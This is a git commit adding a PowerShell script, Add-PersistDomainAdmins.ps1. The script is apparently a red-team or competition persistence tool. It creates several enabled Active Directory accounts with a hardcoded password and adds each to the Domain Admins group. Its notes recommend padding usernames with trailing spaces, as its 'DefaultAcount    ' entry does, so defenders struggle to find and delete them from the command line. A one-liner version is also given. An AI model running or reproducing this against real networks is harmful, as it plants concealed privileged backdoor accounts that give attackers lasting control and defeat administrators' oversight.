5a42b6458c5071aeadbe2b1cecc54d8bc0786d8d
Altoid0 <Altoid0@IRON-FORGE>
2022-04-14 18:03:15 -0700

    Persistence: Domain Admins

---
+++ Add-PersistDomainAdmins.ps1
@@ -0,0 +1,31 @@
+function Add-PersistDomainAdmins {
+    <#
+    .SYNOPSIS
+    This uses the Powershell Active Directory module's New-ADUser and Add-ADGroupMember to create multiple extraneous Domain Admins
+    Function: Add-PersistDomainAdmins
+    Author: Altoid0, Twitter: @Altoid0day
+    Version: 1.0
+    .DESCRIPTION
+    Just spam the DC with extra Domain Admins for persistence
+    .NOTES
+    Simple trick to add complexity can be the addition of spaces at the end of usernames. 
+    They are invisible from the CLI making it difficult to detect and delete users without the presence of a GUI.
+
+    One Liner version (can be optimized):
+    
+    @('a','b','c','d','e','f') | % {New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force);Add-ADGroupMember -Identity "Domain Admins" -Members $_}
+    #>
+    
+        @(
+            'a',
+            'b',
+            'c',
+            'd',
+            'e',
+            'f',
+            'DefaultAcount    ' # 4 spaces
+        ) | ForEach-Object {
+            New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force)
+            Add-ADGroupMember -Identity "Domain Admins" -Members $_
+        }
+    }
